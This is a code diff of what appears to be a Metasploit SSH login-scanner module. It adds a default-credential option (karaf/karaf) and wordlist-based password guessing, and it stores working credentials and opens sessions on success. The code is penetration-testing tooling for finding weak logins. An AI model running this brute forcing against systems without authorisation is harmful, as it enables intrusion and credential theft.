@@ -36,7 +36,8 @@ class Metasploit3 < Msf::Auxiliary
         # TODO Set default user, pass
         Opt::RPORT(8101),
         OptString.new('USERNAME', [true, 'Username', 'karaf']),
-        OptString.new('PASSWORD', [true, 'Password', 'karaf'])
+        OptString.new('PASSWORD', [true, 'Password', 'karaf']),
+        OptBool.new('TRYDEFAULTCRED', [false, 'Specify whether to try default creds', true])
       ], self.class
     )
 
@@ -97,7 +98,7 @@ class Metasploit3 < Msf::Auxiliary
       Timeout.timeout(5) do
         proof = ssh_socket.exec!("shell:info\n").to_s
       end
-    rescue ::Exception
+    rescue Timeout::Error
     end
     proof
   end
@@ -107,9 +108,19 @@ class Metasploit3 < Msf::Auxiliary
     print_status("Attempting login to #{ip}:#{rport}...")
 
     cred_collection = Metasploit::Framework::CredentialCollection.new(
+      blank_passwords: datastore['BLANK_PASSWORDS'],
+      pass_file: datastore['PASS_FILE'],
       password: datastore['PASSWORD'],
-      username: datastore['USERNAME']
+      user_file: datastore['USER_FILE'],
+      userpass_file: datastore['USERPASS_FILE'],
+      username: datastore['USERNAME'],
+      user_as_pass: datastore['USER_AS_PASS']
     )
+
+    if datastore['TRYDEFAULTCRED']
+      cred_collection.additional_privates << 'karaf'
+      cred_collection.additional_publics << 'karaf'
+    end
 
     scanner = Metasploit::Framework::LoginScanner::SSH.new(
       host: ip,
@@ -135,18 +146,12 @@ class Metasploit3 < Msf::Auxiliary
           credential_data[:core] = credential_core
           create_credential_login(credential_data)
           session_setup(result, scanner.ssh_socket)
-          :next_user
         when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
-          if datastore['VERBOSE']
-            print_brute :level => :verror, :ip => ip, :msg => "Could not connect: #{result.proof}"
-          end
+          vprint_brute :level => :verror, :ip => ip, :msg => "Could not connect: #{result.proof}"
           scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
           invalidate_login(credential_data)
-          :abort
         when Metasploit::Model::Login::Status::INCORRECT
-          if datastore['VERBOSE']
-            print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
-          end
+          vprint_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
           invalidate_login(credential_data)
           scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
         else
